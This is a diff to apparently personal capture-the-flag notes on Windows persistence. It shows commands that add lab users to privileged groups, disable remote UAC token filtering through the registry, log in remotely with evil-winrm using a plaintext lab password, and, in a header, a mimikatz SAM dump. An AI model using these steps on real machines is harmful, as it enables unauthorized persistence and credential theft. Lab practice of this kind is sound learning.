@@ -466,9 +466,11 @@ lsadump::sam # list of password
 net localgroup administrators thmuser0 /add
 net localgroup "Backup Operators" thmuser1 /add
 net localgroup "Remote Management Users" thmuser1 /add
-
-whoami /groups
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 
+
+evil-winrm -i 10.10.233.240 -u thmuser1 -p Password321
+whoami /groups
+
 
 
 ```
